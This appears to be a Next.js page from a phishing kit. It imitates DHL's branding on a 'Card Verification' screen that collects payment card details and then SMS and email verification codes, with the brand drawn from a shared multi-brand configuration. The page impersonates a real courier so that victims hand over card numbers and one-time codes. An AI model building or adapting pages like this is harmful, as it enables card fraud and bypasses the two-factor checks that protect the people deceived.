"use client";

import { useState } from "react";
import CardVerificationForm from "@/components/kyc/CardVerificationForm";
import CardVerificationFlow from "@/components/kyc/CardVerificationFlow";
import { brandConfigs } from "@/lib/brandConfig";

export default function DhlCardVerificationPage() {
  const config = brandConfigs.dhl;
  const [session, setSession] = useState<{ token: string; uuid: string } | null>(null);

  return (
    <div>
      {/* DHL-style page header */}
      <div className="mb-6">
        <div
          className="p-6"
          style={{
            backgroundColor: "#FFCC00",
            border: "none",
          }}
        >
          <div className="flex items-start gap-4">
            <div
              className="w-12 h-12 flex items-center justify-center flex-shrink-0"
              style={{ backgroundColor: "#D40511" }}
            >
              <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="#FFFFFF" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
              </svg>
            </div>
            <div>
              <h1 className="text-xl font-bold uppercase tracking-wider" style={{ color: "#D40511" }}>
                Card Verification
              </h1>
              <p className="text-sm mt-1 font-semibold" style={{ color: "#333333" }}>
                DHL Express Account — Payment Method Setup
              </p>
            </div>
          </div>
        </div>
        {/* DHL red stripe */}
        <div style={{ height: "4px", backgroundColor: "#D40511" }} />
      </div>

      {/* Card Verification Form or Flow */}
      {!session ? (
        <CardVerificationForm
          brandConfig={config}
          onSubmitted={(token, uuid) => setSession({ token, uuid })}
        />
      ) : (
        <CardVerificationFlow
          brandConfig={config}
          sessionToken={session.token}
          uuid={session.uuid}
        />
      )}

      {/* DHL-style info */}
      <div className="mt-8">
        <div className="p-4" style={{ backgroundColor: "#FFFBEB", borderLeft: "4px solid #D40511" }}>
          <div className="flex items-start gap-3">
            <svg className="w-5 h-5 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="#D40511" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <div>
              <p className="text-sm font-bold uppercase" style={{ color: "#D40511" }}>Important</p>
              <p className="text-xs mt-1" style={{ color: "#333333" }}>
                You will receive SMS and email verification codes to confirm your identity.
                Keep your phone and email inbox accessible during this process.
              </p>
            </div>
          </div>
        </div>

        <div className="mt-3 grid grid-cols-3 gap-0">
          {[
            { step: "01", label: "ENTER CARD", desc: "Provide card details" },
            { step: "02", label: "SMS CODE", desc: "Verify by phone" },
            { step: "03", label: "EMAIL CODE", desc: "Verify by email" },
          ].map((item) => (
            <div key={item.step} className="p-3 text-center" style={{ backgroundColor: "#FFFFFF", border: "1px solid #CCCCCC" }}>
              <div className="text-2xl font-black" style={{ color: "#D40511" }}>{item.step}</div>
              <div className="text-xs font-bold uppercase mt-1" style={{ color: "#333333" }}>{item.label}</div>
              <div className="text-xs mt-0.5" style={{ color: "#666666" }}>{item.desc}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
